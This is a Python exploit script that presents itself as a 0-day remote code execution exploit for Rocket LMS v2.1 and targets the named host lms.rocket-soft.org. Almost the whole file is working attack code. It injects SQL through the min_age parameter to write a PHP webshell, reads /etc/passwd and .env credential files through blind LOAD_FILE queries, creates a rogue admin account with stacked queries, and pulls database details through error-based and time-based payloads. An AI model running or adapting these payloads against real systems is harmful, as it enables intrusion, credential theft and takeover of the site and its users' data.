"""
ROCKET LMS v2.1 - NOVEL 0-DAY RCE EXPLOIT
==========================================

TARGET: lms.rocket-soft.org

DISCOVERED VULNERABILITIES:
1. SQL Injection in /instructor-finder via min_age/max_age parameters
   - Direct string concatenation in whereRaw() without parameterization
   - File: app/Http/Controllers/Web/InstructorFinderController.php:397
   - Code: $userAgeQuery->whereRaw('value >= ' . $minAge);

2. Arbitrary File Write via UpdateController
   - ZIP extraction uses paths from config.json
   - File: app/Http/Controllers/Admin/UpdateController.php:95
   - Code: copy("$path/{$file['root_directory']}", base_path($file['update_directory']));

NOVEL EXPLOITATION TECHNIQUES:
1. SQLi -> INTO OUTFILE -> Webshell (if FILE privilege exists)
2. SQLi -> Stacked queries -> Create admin user -> Access UpdateController
3. SQLi -> Load file() -> SSRF to internal services
4. SQLi -> Blind time-based to exfiltrate DB credentials -> Direct DB access

Author: Security Research
Date: 2025-12-28
"""

import requests
import re
import time
import urllib.parse

BASE_URL = "https://lms.rocket-soft.org"
ADMIN_EMAIL = "admin@demo.com"
ADMIN_PASS = "admin"

session = requests.Session()
session.timeout = 30

def login():
    print("[*] Logging in...")
    r = session.get(f"{BASE_URL}/admin/login")
    csrf = re.search(r'name="_token" value="([^"]+)"', r.text).group(1)
    session.post(f"{BASE_URL}/admin/login", data={"_token": csrf, "email": ADMIN_EMAIL, "password": ADMIN_PASS})
    print("[+] Logged in")

def sqli_request(payload):
    """Send SQLi payload via min_age parameter"""
    url = f"{BASE_URL}/instructor-finder"
    params = {"min_age": payload}
    r = session.get(url, params=params, timeout=30)
    return r

def exploit_into_outfile():
    """
    TECHNIQUE 1: SQLi -> INTO OUTFILE -> Webshell
    Attempts to write a PHP shell directly to the web root
    Requires MySQL FILE privilege
    """
    print("\n" + "="*60)
    print("    EXPLOIT 1: SQLi INTO OUTFILE")
    print("="*60)
    
    webshell = "<?php system($_GET['c']); ?>"
    webshell_hex = webshell.encode().hex()
    
    # Target paths for shell
    shell_paths = [
        "/var/www/html/shell.php",
        "/var/www/lms/public/shell.php",
        "/var/www/public/shell.php",
        "/home/lms/public/shell.php",
    ]
    
    for shell_path in shell_paths:
        # Payload: Use UNION to write file
        # Format: 1 UNION SELECT "shell" INTO OUTFILE '/path/to/shell.php'
        payload = f"1 UNION SELECT 0x{webshell_hex} INTO OUTFILE '{shell_path}'"
        
        print(f"\n[*] Attempting to write shell to: {shell_path}")
        print(f"    Payload: {payload[:60]}...")
        
        try:
            r = sqli_request(payload)
            print(f"    Response: {r.status_code}, Length: {len(r.text)}")
            
            # Check if shell was created
            time.sleep(1)
            shell_url = f"{BASE_URL}/shell.php?c=id"
            check = session.get(shell_url, timeout=10)
            
            if "uid=" in check.text:
                print(f"\n[!!!] RCE SUCCESS VIA INTO OUTFILE!")
                print(f"[!!!] Shell URL: {shell_url}")
                return shell_url
                
        except Exception as e:
            print(f"    Error: {e}")
    
    print("\n[-] INTO OUTFILE failed (FILE privilege likely not granted)")
    return None

def exploit_load_file_ssrf():
    """
    TECHNIQUE 2: SQLi -> LOAD_FILE() -> Read sensitive files
    Can read /etc/passwd, .env, database configs
    """
    print("\n" + "="*60)
    print("    EXPLOIT 2: SQLi LOAD_FILE (Internal File Read)")
    print("="*60)
    
    files_to_read = [
        "/etc/passwd",
        "/var/www/.env",
        "/var/www/html/.env",
        "/var/www/lms/.env",
        "/home/lms/.env",
        "/proc/self/environ",
    ]
    
    for file_path in files_to_read:
        # Use Boolean-based to check if file exists and read content
        # Check if first char of file is > certain ASCII value
        
        chars_found = ""
        print(f"\n[*] Attempting to read: {file_path}")
        
        for pos in range(1, 50):  # Read first 50 chars
            found_char = False
            
            for char_code in range(32, 127):
                # Payload: 1 AND ASCII(SUBSTR(LOAD_FILE('/etc/passwd'),1,1))=114
                payload = f"1 AND ASCII(SUBSTR(LOAD_FILE('{file_path}'),{pos},1))={char_code}"
                
                try:
                    r = sqli_request(payload)
                    
                    # If TRUE condition (large response), char found
                    if len(r.text) > 100000:  # Threshold for TRUE
                        chars_found += chr(char_code)
                        print(f"\r    [+] Found: {chars_found}", end="", flush=True)
                        found_char = True
                        break
                        
                except:
                    pass
            
            if not found_char:
                break
        
        if chars_found:
            print(f"\n    [+] File content: {chars_found}")
            
            # Check for credentials
            if "APP_KEY=" in chars_found or "DB_PASSWORD=" in chars_found:
                print(f"\n[!!!] CREDENTIALS FOUND!")
                return chars_found
    
    return None

def exploit_stacked_queries():
    """
    TECHNIQUE 3: SQLi -> Stacked Queries -> Create Admin User
    If stacked queries work, we can INSERT a new admin user
    """
    print("\n" + "="*60)
    print("    EXPLOIT 3: STACKED QUERIES (Admin User Creation)")
    print("="*60)
    
    # Password hash for 'hacked123' using bcrypt
    password_hash = "$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi"
    
    # Payload to insert new admin user
    # Format: 1; INSERT INTO users (email, password, role_id, status, created_at) VALUES (...)
    payload = f"1; INSERT INTO users (full_name, email, password, role_id, status, created_at) VALUES ('Hacker', 'hacker@pwned.com', '{password_hash}', 1, 'active', {int(time.time())})"
    
    print(f"[*] Attempting to create admin user...")
    print(f"    Email: hacker@pwned.com")
    print(f"    Password: hacked123")
    
    try:
        r = sqli_request(payload)
        print(f"    Response: {r.status_code}")
        
        # Try to login with new user
        time.sleep(1)
        
        r2 = session.get(f"{BASE_URL}/login")
        csrf = re.search(r'name="_token" value="([^"]+)"', r2.text)
        if csrf:
            login_data = {
                "_token": csrf.group(1),
                "email": "hacker@pwned.com",
                "password": "hacked123"
            }
            r3 = session.post(f"{BASE_URL}/login", data=login_data)
            
            if "/panel" in r3.url or "/admin" in r3.url:
                print(f"\n[!!!] ADMIN USER CREATED AND LOGIN SUCCESSFUL!")
                return True
                
    except Exception as e:
        print(f"    Error: {e}")
    
    print("[-] Stacked queries not supported or INSERT failed")
    return None

def exploit_error_based():
    """
    TECHNIQUE 4: Error-Based SQLi -> Extract DB info via errors
    Uses EXTRACTVALUE/UPDATEXML for MySQL error-based extraction
    """
    print("\n" + "="*60)
    print("    EXPLOIT 4: ERROR-BASED SQLi (Data Extraction)")
    print("="*60)
    
    # Error-based payloads
    payloads = [
        # EXTRACTVALUE
        "1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))",
        "1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e))",
        "1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))",
        
        # UPDATEXML
        "1 AND UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)",
        "1 AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)",
        
        # Double query
        "1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
    ]
    
    for payload in payloads:
        print(f"\n[*] Testing: {payload[:50]}...")
        
        try:
            r = sqli_request(payload)
            
            # Look for extracted data in error messages
            if "~" in r.text or "XPATH" in r.text or "Duplicate" in r.text:
                # Extract the data between ~ characters
                match = re.search(r'~([^~]+)~', r.text)
                if match:
                    print(f"    [+] Extracted: {match.group(1)}")
                    return match.group(1)
                    
        except Exception as e:
            print(f"    Error: {e}")
    
    print("[-] Error-based extraction did not reveal data in response")
    return None

def exploit_time_based_file_priv():
    """
    TECHNIQUE 5: Time-Based -> Check FILE privilege
    Uses SLEEP to determine if FILE privilege exists
    """
    print("\n" + "="*60)
    print("    EXPLOIT 5: TIME-BASED FILE PRIVILEGE CHECK")
    print("="*60)
    
    # Check if we have FILE privilege
    # If LOAD_FILE returns non-null, we have FILE priv
    payload = "1 AND IF((SELECT LOAD_FILE('/etc/passwd') IS NOT NULL),SLEEP(3),0)"
    
    print("[*] Checking FILE privilege via time-based test...")
    
    start = time.time()
    try:
        r = sqli_request(payload)
        elapsed = time.time() - start
        
        if elapsed >= 3:
            print(f"    [+] FILE privilege CONFIRMED! (Response took {elapsed:.1f}s)")
            return True
        else:
            print(f"    [-] FILE privilege not available (Response took {elapsed:.1f}s)")
            
    except Exception as e:
        print(f"    Error: {e}")
    
    return False

def main():
    print("""
╔══════════════════════════════════════════════════════════════╗
║     ROCKET LMS v2.1 - NOVEL 0-DAY RCE EXPLOIT                ║
║     Target: lms.rocket-soft.org                              ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    login()
    
    # Try each exploitation technique
    
    # 1. Time-based to check FILE privilege
    has_file_priv = exploit_time_based_file_priv()
    
    if has_file_priv:
        # 2. Try INTO OUTFILE
        shell = exploit_into_outfile()
        if shell:
            print(f"\n[+] RCE ACHIEVED! Shell at: {shell}")
            return
        
        # 3. Try LOAD_FILE to read sensitive files
        creds = exploit_load_file_ssrf()
        if creds:
            print(f"\n[+] Credentials extracted!")
    
    # 4. Try Error-based extraction
    data = exploit_error_based()
    if data:
        print(f"\n[+] Data extracted via error-based: {data}")
    
    # 5. Try Stacked queries
    exploit_stacked_queries()
    
    print("\n" + "="*60)
    print("    EXPLOITATION COMPLETE")
    print("="*60)

if __name__ == "__main__":
    main()
